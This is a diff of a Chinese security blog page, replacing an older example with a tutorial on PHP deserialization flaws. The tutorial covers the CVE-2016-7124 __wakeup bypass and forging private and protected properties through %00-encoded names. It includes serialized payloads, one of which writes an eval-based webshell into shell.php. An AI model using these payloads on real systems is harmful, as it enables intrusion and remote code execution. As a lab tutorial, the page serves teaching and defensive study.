-<div class="_2Uzcx_"><button class="VJbwyy" type="button" aria-label="复制代码"><i aria-label="icon: copy" class="anticon anticon-copy"><svg viewBox="64 64 896 896" focusable="false" class="" data-icon="copy" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M832 64H296c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h496v688c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V96c0-17.7-14.3-32-32-32zM704 192H192c-17.7 0-32 14.3-32 32v530.7c0 8.5 3.4 16.6 9.4 22.6l173.3 173.3c2.2 2.2 4.7 4 7.4 5.5v1.9h4.2c3.5 1.3 7.2 2 11 2H704c17.7 0 32-14.3 32-32V224c0-17.7-14.3-32-32-32zM350 856.2L263.9 770H350v86.2zM664 888H414V746c0-22.1-17.9-40-40-40H232V264h432v624z"></path></svg></i></button><pre class="line-numbers  language-css"><code class="  language-css"><span class="token selector">O:7:"example":1:</span><span class="token punctuation">{</span><span class="token property">s</span><span class="token punctuation">:</span>4<span class="token punctuation">:</span><span class="token string">"test"</span><span class="token punctuation">;</span><span class="token property">s</span><span class="token punctuation">:</span>8<span class="token punctuation">:</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div>
-<p>再将这个字符串传给<code>f</code>参数，就可以显示<code>flag.php</code>的内容<br>
-</p><div class="image-package">
-<div class="image-container" style="max-width: 658px; max-height: 362px; background-color: transparent;">
-<div class="image-container-fill" style="padding-bottom: 55.02%;"></div>
-<div class="image-view" data-width="658" data-height="362"><img data-original-src="//upload-images.jianshu.io/upload_images/9144690-e7cf4e57fcaaca23.png" data-original-width="658" data-original-height="362" data-original-format="image/png" data-original-filesize="23631" data-image-index="7" style="cursor: zoom-in;" class="" src="//upload-images.jianshu.io/upload_images/9144690-e7cf4e57fcaaca23.png?imageMogr2/auto-orient/strip|imageView2/2/w/658/format/webp"></div>
-</div>
-<div class="image-caption">image.png</div>
-</div><p></p>
+        <p><h1><a name="t0"></a><a id="PHP_0"></a>PHP反序列化漏洞</h1></p>
+<h4><a id="PHPFIRSThttpsblogcsdnnetweixin_43726831articledetails102923033_1"></a><a href="https://blog.csdn.net/weixin_43726831/article/details/102923033" target="_blank" rel="noopener">PHP反序列化漏洞原理概述-FIRST</a></h4>
+<h4><a id="1_2"></a>1.绕过魔法函数</h4>
+<p><strong>wakeup()魔法函数</strong></p>
+<ul>
+<li>在<strong>unserialize()反序列化函数执行</strong>时会检测是否存在wakeup()方法，如果存在<strong>会先调用wakeup()方法</strong>作为预先准备对象需要的资源，经常用于执行一些初始化操作，或者重现建立数据库连接等场景</li>
+</ul>
+<p>PHP反序列化漏洞<strong>CVE-2016-7124</strong></p>
+<ul>
+<li>当反序列化字符串中，表示<strong>属性个数的值大于真实属性个数时</strong>，会绕过 __wakeup 函数的执行</li>
+</ul>
+<p><strong>影响范围</strong></p>
+<ul>
+<li>PHP5&lt;5.6.25</li>
+<li>PHP7&lt;7.0.10</li>
+<li>我们当前的PHP环境版本为5.4.45&lt;5.6.25,存在该反序列化漏洞</li>
+</ul>
+<p><strong>1.wakeup()绕过原理demo</strong></p>
+<pre class="prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token comment">//7.php</span>
+<span class="token delimiter important">&lt;?php</span>
+	<span class="token keyword">class</span> <span class="token class-name">wakeup_bug</span>
+	<span class="token punctuation">{</span>
+		<span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token single-quoted-string string">'wakeup'</span><span class="token punctuation">;</span>
+		<span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+		<span class="token punctuation">{</span>
+			<span class="token keyword">echo</span> <span class="token single-quoted-string string">'I an not '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">a</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+		<span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+		<span class="token punctuation">{</span>
+			<span class="token keyword">echo</span> <span class="token single-quoted-string string">'I am '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">a</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;/br&gt;'</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+	<span class="token punctuation">}</span>
+	<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></pre>
+<p><strong>构造payload：</strong><br>
+我们自己按照这个类的格式，构造出一个序列化后的对象，如下</p>
+<pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">O:10:<span class="token string">"wakeup_bug"</span>:1:<span class="token punctuation">{</span>s:1:<span class="token string">"a"</span><span class="token punctuation">;</span>s:6:<span class="token string">"wakeup"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
+<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style="">
+<p>同时我们可以发现 <strong>__wakeup()在__destruct()函数之前执行</strong>，说明，只要存在了反序列化操作，__wakeup()函数的优先级高。<br>
+<img src="https://img-blog.csdnimg.cn/20191107202343431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
+当属性个数值大于真实属性个数值时，可绕过wakeup()函数，我们将自定义的序列化值修改一下，如下</p>
+<p>将属性个数改为2&gt;真实属性个数1</p>
+<pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">O:10:<span class="token string">"wakeup_bug"</span>:2:<span class="token punctuation">{</span>s:1:<span class="token string">"a"</span><span class="token punctuation">;</span>s:6:<span class="token string">"wakeup"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
+<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style="">
+<p>绕过wakeup()函数成功，只执行了destruct()函数。<br>
+<img src="https://img-blog.csdnimg.cn/20191107203022115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
+<strong>2.wakeup()绕过原理demo1</strong></p>
+<ul>
+<li>在该demo中，<strong>__destruct()</strong> 中定义了文件操作，打开一个shell.php文件，写入变量$a的值，然后保存关闭该文件。</li>
+<li>而 <strong>__wakeup()</strong> 函数中定义了<br>
+foreach()函数：遍历数组函数<br>
+get_object_vars()：返回由对象属性组成的关联数组<br>
+<strong>在此处将$this指向的对象的值清空</strong></li>
+<li>该demo1中有<strong>写入文件操作</strong>，这是一个<strong>危险操作</strong>，当我们能绕过__wakeup()函数，就可以写入<strong>一句话木马</strong>，获取webshell</li>
+</ul>
+<pre class="prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token comment">//8.php</span>
+<span class="token delimiter important">&lt;?php</span>
+	<span class="token keyword">class</span> <span class="token class-name">a</span>
+	<span class="token punctuation">{</span>
+		<span class="token keyword">var</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token double-quoted-string string">"test"</span><span class="token punctuation">;</span>
+		<span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+		<span class="token punctuation">{</span>
+			<span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"shell.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"w+"</span><span class="token punctuation">)</span>
+			<span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+		<span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//清空$a的值</span>
+		<span class="token punctuation">{</span>
+			<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">get_object_vars</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$b</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token variable">$c</span><span class="token punctuation">)</span>
+			<span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
+		<span class="token punctuation">}</span>
+	<span class="token punctuation">}</span>
+<span class="token delimiter important">?&gt;</span>
+</pre>
+<p>由于__wakeup()函数执行先于__destruct()函数，也就是说，在 <strong>__destruct()函数执行文件操作</strong> 时，而_<strong>_wakeup()函数已经清空了$a的值</strong>，__destruct()函数写入shell.php文件的<strong>为空值</strong>。</p>
+<p>此时就需要绕过__wakeup()函数<br>
+<strong>构造payload</strong></p>
+<p>我们自己按照这个类的格式，构造出一个序列化后的对象，对象的属性值赋予一句话木马，写入文件，如下</p>
+<pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">O:1:<span class="token string">"a"</span>:1:<span class="token punctuation">{</span>s:1:<span class="token string">"a"</span><span class="token punctuation">;</span>s:27:<span class="token string">"&lt;?php @eval(<span class="token variable">$_POST</span>[123]);?&gt;"</span><span class="token punctuation">}</span>
+<div class="hljs-button {2}" data-title="复制"></div></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20191107211054749.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<ul>
+<li><strong>木马植入成功</strong>，中国菜刀连接成功</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20191107211657762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h4><a id="2privateprotected_94"></a>2.private(私有)、protected(保护)属性外部修改</h4>
+<p><strong>public属性可以被外部修改</strong>而<strong>private</strong>、<strong>proctected</strong>属性无法被对象外部修改</p>
+<p><strong>原理dome</strong></p>
+<p><strong>__toString()函数：</strong> 把类当做字符串使用时触发，也就是使用echo打印对象时触发该函数。</p>
+<pre class="prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token comment">//9.php</span>
+<span class="token delimiter important">&lt;?php</span>
+	<span class="token keyword">class</span> <span class="token class-name">stundet</span>
+	<span class="token punctuation">{</span>
+		<span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token single-quoted-string string">'BYF'</span><span class="token punctuation">;</span>
+		<span class="token keyword">private</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token single-quoted-string string">'20'</span><span class="token punctuation">;</span>
+		<span class="token keyword">protected</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token single-quoted-string string">'boy'</span><span class="token punctuation">;</span>
+		<span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+		<span class="token punctuation">{</span>
+			<span class="token keyword">return</span> <span class="token single-quoted-string string">'name: '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">name</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;/br&gt;age: '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">age</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;/br&gt;sex: '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">sex</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+	<span class="token punctuation">}</span>
+	<span class="token variable">$s1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">stundet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">echo</span> <span class="token variable">$s1</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;/br&gt;'</span><span class="token punctuation">;</span>
+	<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$s1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span>
+<div class="hljs-button {2}" data-title="复制"></div></code></pre>
+<p>下图为demo执行结果<br>
+<img src="https://img-blog.csdnimg.cn/20191107224524316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
+我们发现，序列化后，private变量，和protected变量的结果与public不一样</p>
+<pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">O:7:<span class="token string">"stundet"</span>:3:<span class="token punctuation">{</span>s:4:<span class="token string">"name"</span><span class="token punctuation">;</span>s:3:<span class="token string">"BYF"</span><span class="token punctuation">;</span>s:12:<span class="token string">"stundetage"</span><span class="token punctuation">;</span>s:2:<span class="token string">"20"</span><span class="token punctuation">;</span>s:6:<span class="token string">"*sex"</span><span class="token punctuation">;</span>s:3:<span class="token string">"boy"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
+<div class="hljs-button {2}" data-title="复制"></div></code></pre>
+<p><strong>private</strong>：在序列化后属性名为，<strong>类+变量名</strong>，且类使用&lt;0x00&gt;<strong>空字符相隔</strong>，在页面回显中无法看出<br>
+<strong>proctected</strong>：在序列化后属性名为，*<strong>+变量名</strong>，且<code>*</code>使用&lt;0x00&gt;<strong>空字符相隔</strong>，在页面回显中无法看出<br>
+<img src="https://img-blog.csdnimg.cn/20191107215848498.png" alt="在这里插入图片描述"><br>
+由于序列化值中存在&lt;0x00&gt;空字符，占用一个字符，在url中%00为空字符</p>
+<p><strong>构造payload</strong></p>
+<p>从外部修改private&amp;proctected属性值</p>
+<pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">O:7:<span class="token string">"stundet"</span>:3:<span class="token punctuation">{</span>s:4:<span class="token string">"name"</span><span class="token punctuation">;</span>s:3:<span class="token string">"SHY"</span><span class="token punctuation">;</span>s:12:<span class="token string">"%00stundet%00age"</span><span class="token punctuation">;</span>s:2:<span class="token string">"19"</span><span class="token punctuation">;</span>s:6:<span class="token string">"%00*%00sex"</span><span class="token punctuation">;</span>s:4:<span class="token string">"girl"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
+<div class="hljs-button {2}" data-title="复制"></div></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20191107225116628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 
       
     </div>
@@ -869,7 +829,7 @@ var jiathis_config={
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-text">PHP反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-text">0x00 何为类和对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-text">0x01 何为序列化和反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-text">0x02 具体漏洞演示</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-text">PHP反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-text">PHP反序列化漏洞原理概述-FIRST</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-text">1.绕过魔法函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-text">2.private(私有)、protected(保护)属性外部修改</span></a></li></ol></li></ol></li></ol></li></ol></div>
             
 
           </div>
@@ -907,7 +867,7 @@ var jiathis_config={
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共15.3k字</span>
+  <span class="post-count">博客全站共13.9k字</span>
 </div>
 
 <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
